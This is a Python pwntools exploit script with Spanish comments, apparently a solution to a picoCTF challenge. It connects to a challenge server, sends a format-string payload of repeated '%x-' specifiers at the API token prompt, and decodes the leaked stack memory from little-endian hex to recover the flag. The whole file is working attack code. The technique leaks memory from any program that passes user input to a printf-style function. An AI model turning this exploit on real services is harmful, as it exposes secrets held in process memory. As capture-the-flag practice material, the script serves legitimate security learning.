from pwn import *

host = 'wily-courier.picoctf.net'
port = 64113

print(f"[*] Conectando al bot en {host}:{port}...")
r = remote(host, port)

r.recvuntil(b"View my portfolio\n")
r.sendline(b"1")
r.recvuntil(b"What is your API token?\n")

# Mandamos 100 bloques para asegurar que entra entera
payload = b"%x-" * 100
r.sendline(payload)

r.recvline()
leaked_data = r.recvline().decode().strip()
print("[*] Memoria capturada. Procesando bytes en Little-Endian...")

bandera_bytes = b""
for bloque in leaked_data.split('-'):
    if len(bloque) == 8: # Solo bloques completos
        try:
            # Lo leemos como bytes puros y le damos la vuelta
            b = bytes.fromhex(bloque)
            bandera_bytes += b[::-1]
        except ValueError:
            pass

# Forzamos la conversión a texto, ignorando la basura de la pila
bandera_sucia = bandera_bytes.decode('ascii', errors='ignore')

if "picoCTF{" in bandera_sucia:
    inicio = bandera_sucia.find("picoCTF{")
    fin = bandera_sucia.find("}", inicio)
    
    if fin != -1:
        print(f"\n[🏆] BANDERA ENCONTRADA: {bandera_sucia[inicio:fin+1]}\n")
    else:
        # Si por algún motivo no encuentra la '}', imprimimos un trozo grande
        print(f"\n[⚠️] La bandera parece cortada:\n{bandera_sucia[inicio:inicio+50]}\n")
else:
    print("\n[-] Bandera no detectada. Aquí tienes el volcado en crudo por si está oculta:")
    print(bandera_sucia)

r.close()
